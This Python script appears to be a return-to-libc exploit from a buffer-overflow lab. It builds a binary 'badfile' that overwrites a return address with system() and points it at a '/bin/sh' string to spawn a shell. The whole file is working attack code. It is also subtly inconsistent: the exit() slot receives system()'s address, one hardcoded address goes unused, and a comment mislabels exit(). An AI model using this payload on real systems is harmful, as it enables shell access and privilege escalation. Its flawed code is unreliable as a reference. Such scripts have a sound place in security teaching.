import sys


with open("addresses.txt", "r") as file:
   lines = file.readlines()
# with open("gdb_output.txt", "r") as file:
#     lines = file.readlines()
# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))
# Parse the addresses
sh_addr = int(lines[0].strip(), 16)      # The address of "/bin/sh"
dash_addr = int(lines[1].strip(), 16)
system_addr = int(lines[2].strip(), 16) # The address of system()
exit_addr = int(lines[3].strip(), 16) # The address of system()
execv_addr = int(lines[4].strip(), 16)

# pattern = r"\$[0-9]+ = {<text variable, no debug info>} (0x[0-9a-f]+)"

# # Extract addresses
# addresses = []
# for line in lines:
#     match = re.search(pattern, line)
#     if match:
#         addresses.append(int(match.group(1), 16))

# # Map extracted addresses to their respective variables
# if len(addresses) >= 3:
#     system_addr = addresses[0]  # Address of system()
#     exit_addr = addresses[1]    # Address of exit()
#     execv_addr = addresses[2]   # Address of execv()
    
#     # Print or use the extracted addresses
#     print(f"system_addr: {hex(system_addr)}")
#     print(f"exit_addr: {hex(exit_addr)}")
#     print(f"execv_addr: {hex(execv_addr)}")
# else:
#     print("Error: Not enough addresses found in the GDB output.")

X = 28
content[X:X+4] = (system_addr).to_bytes(4,byteorder='little')
Y = 32
exit_addr = 0xf7dbb460    # The address of exit()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
Z = 36
content[Z:Z+4] = (0xffffdfa7).to_bytes(4,byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
 f.write(content)
 
